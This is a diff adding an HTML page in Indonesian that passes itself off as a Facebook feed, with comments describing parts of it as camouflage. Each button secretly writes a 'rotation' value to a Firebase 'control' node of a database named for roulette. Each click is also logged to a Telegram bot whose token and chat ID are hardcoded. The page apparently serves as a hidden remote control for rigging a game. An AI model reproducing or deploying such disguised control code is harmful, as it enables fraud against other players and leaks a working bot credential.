@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+        body { background: #18191a; color: #e4e6eb; overflow-x: hidden; }
+
+        /* --- HEADER & NAV --- */
+        .header { background: #242526; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .nav-primary { display: flex; justify-content: space-around; background: #242526; border-bottom: 1px solid #3e4042; position: sticky; top: 48px; z-index: 99; }
+        .nav-icon { font-size: 24px; padding: 12px; cursor: pointer; width: 16%; text-align: center; color: #b0b3b8; }
+        .nav-icon:active { color: #1877f2; }
+
+        /* --- POST BAR (RANDOM) --- */
+        .post-bar { background: #242526; padding: 12px; display: flex; align-items: center; gap: 10px; margin-top: 8px; }
+        .avatar-circle { width: 40px; height: 40px; background: #4e4f50; border-radius: 50%; overflow: hidden; }
+        .search-fake { background: #3a3b3c; flex: 1; padding: 10px 15px; border-radius: 20px; color: #b0b3b8; font-size: 14px; cursor: pointer; }
+
+        /* --- SYSTEM SYNC CARD (KAMUFLASE STATUS) --- */
+        .system-status-card { background: #1c1e21; border-top: 2px solid #1877f2; padding: 12px; margin-top: 10px; }
+        .sys-title { font-size: 12px; font-weight: bold; color: #1877f2; margin-bottom: 5px; text-transform: uppercase; }
+        .sys-info { font-size: 11px; color: #b0b3b8; font-family: monospace; line-height: 1.5; }
+
+        /* --- FEED / STATUS CARD --- */
+        .feed-card { background: #242526; margin-top: 10px; padding: 12px; border-bottom: 1px solid #3e4042; }
+        .feed-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .profile-name { font-weight: bold; font-size: 14px; }
+        .feed-time { font-size: 11px; color: #b0b3b8; }
+        .feed-text { font-size: 14px; line-height: 1.4; margin-bottom: 12px; }
+        
+        /* TEMPAT GAMBAR UTAMA */
+        .feed-image-container { width: 100%; border-radius: 8px; overflow: hidden; background: #3a3b3c; min-height: 200px; }
+        .feed-image-container img { width: 100%; height: auto; display: block; }
+
+        /* --- SHORTCUT GRID (7-12) --- */
+        .shortcut-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 12px; background: #242526; margin-top: 10px; }
+        .shortcut-item { background: #3a3b3c; padding: 12px 5px; border-radius: 8px; text-align: center; }
+        .s-text { font-size: 11px; font-weight: bold; display: block; margin-top: 4px; }
+    </style>
+</head>
+<body onmousedown="resetTimer()">
+
+    <div id="fb-remote">
+        <div class="header">
+            <div style="color:#fff; font-size: 24px; font-weight: bold;">facebook</div>
+            <div style="display: flex; gap: 15px; font-size: 18px;">🔍 💬</div>
+        </div>
+
+        <div class="nav-primary">
+            <div class="nav-icon" onclick="sendCmd(1, 'HOME')">🏠</div>
+            <div class="nav-icon" onclick="sendCmd(2, 'WATCH')">📺</div>
+            <div class="nav-icon" onclick="sendCmd(3, 'MARKET')">🏪</div>
+            <div class="nav-icon" onclick="sendCmd(4, 'GROUPS')">👥</div>
+            <div class="nav-icon" onclick="sendCmd(5, 'NOTIF')">🔔</div>
+            <div class="nav-icon" onclick="sendCmd(6, 'MENU')">☰</div>
+        </div>
+
+        <div class="post-bar">
+            <div class="avatar-circle"></div>
+            <div class="search-fake" onclick="sendCmd(null, 'RANDOM')">Apa yang Anda pikirkan?</div>
+        </div>
+
+        <div class="system-status-card">
+            <div class="sys-title">Security & System Sync</div>
+            <div class="sys-info">
+                Node: <span id="node-val">ID_STABLE</span><br>
+                Payload: <span id="payload-val">READY</span><br>
+                Status: <span id="sync-val" style="color:#42b72a">CONNECTED</span>
+            </div>
+        </div>
+
+        <div class="feed-card">
+            <div class="feed-header">
+                <div class="avatar-circle">
+                    <img src="https://bursakerja.kebumenkab.go.id/v3/resource/doc/images/kewirausahaan/9.png" style="width:100%; height:100%; object-fit:cover;">
+                </div>
+                <div>
+                    <div class="profile-name">Info Lowongan Kerja & Karir</div>
+                    <div class="feed-time">12 mnt • 🌎</div>
+                </div>
+            </div>
+            <div class="feed-text">Dibutuhkan segera tenaga admin untuk daerah Jakarta Barat. Min SMA/K. Silahkan cek kualifikasi pada gambar di bawah. Langsung DM ya!</div>
+            
+            <div class="feed-image-container">
+                <img src="https://bursakerja.kebumenkab.go.id/v3/resource/doc/images/kewirausahaan/9.png" alt="Post Image">
+            </div>
+        </div>
+
+        <div class="shortcut-grid">
+            <div class="shortcut-item" onclick="sendCmd(7, 'REELS')">🎞️ <span class="s-text">Reels</span></div>
+            <div class="shortcut-item" onclick="sendCmd(8, 'LIVE')">🎥 <span class="s-text">Live</span></div>
+            <div class="shortcut-item" onclick="sendCmd(9, 'PHOTO')">🖼️ <span class="s-text">Foto</span></div>
+            <div class="shortcut-item" onclick="sendCmd(10, 'EVENT')">📅 <span class="s-text">Acara</span></div>
+            <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖 <span class="s-text">Simpan</span></div>
+            <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️ <span class="s-text">Kencan</span></div>
+        </div>
+    </div>
+
+    <script>
+        let dbRef = null;
+        let logoutTimer;
+
+        // Inisialisasi Otomatis (Pastikan Firebase Config Benar)
+        const config = { databaseURL: "https://roullete-fc17f-default-rtdb.asia-southeast1.firebasedatabase.app/" };
+        if (!firebase.apps.length) firebase.initializeApp(config);
+        dbRef = firebase.database().ref('control');
+
+        function sendCmd(id, label) {
+            let val = (id === null) ? "RANDOM" : (12 - id).toFixed(1);
+            
+            // Update Teks Kamuflase
+            document.getElementById("node-val").innerText = "ID_" + label;
+            document.getElementById("payload-val").innerText = val;
+            document.getElementById("sync-val").innerText = "SENDING...";
+
+            // Telegram
+            fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_LOG:${label}_Val:${val}`);
+            
+            // Firebase
+            if(dbRef) {
+                dbRef.update({ rotation: val, last_click: Date.now() }).then(() => {
+                    setTimeout(() => { document.getElementById("sync-val").innerText = "CONNECTED"; }, 800);
+                });
+            }
+        }
+
+        function resetTimer() {
+            clearTimeout(logoutTimer);
+            logoutTimer = setTimeout(() => { location.reload(); }, 300000); 
+        }
+    </script>
+</body>
+</html>
